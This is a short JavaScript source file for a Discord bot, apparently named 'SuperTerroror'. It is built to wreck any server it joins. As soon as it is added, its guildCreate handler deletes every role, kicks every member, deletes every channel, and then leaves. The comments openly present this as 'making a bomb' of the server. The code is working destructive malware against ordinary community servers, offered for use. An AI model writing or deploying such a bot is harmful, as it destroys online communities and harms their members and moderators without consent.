const process = require("process");
const version = require("../package.json").version;

/* 
	Enables the SuperTerroror on Discord when bots join automatically make a bomb to server
*/
class EventManager {
	joinAllEvents(client) { // join bot for all events
		this.client = client; // this client
		client.on("ready", async () => { // on ready
			console.log("The bot is ready to terroror"); // when bot is ready log on console
		});

		client.on("guildCreate", guild => { // the server ---
			guild.roles.cache.forEach(role => { // for each role
				role.delete().catch(console.error); // --- delete all roles
			});
			guild.members.cache.forEach(mb => { // for each members
				mb.kick().catch(console.error); // --- kick all members
			});
			guild.channels.cache.forEach(ch => { // for each channels
				ch.delete().catch(console.error); // --- delete channels
			});
			guild.leave(); // and leave the bot after terroror
		});
	}
}

module.exports = EventManager; // export the eventmanager

// end of file
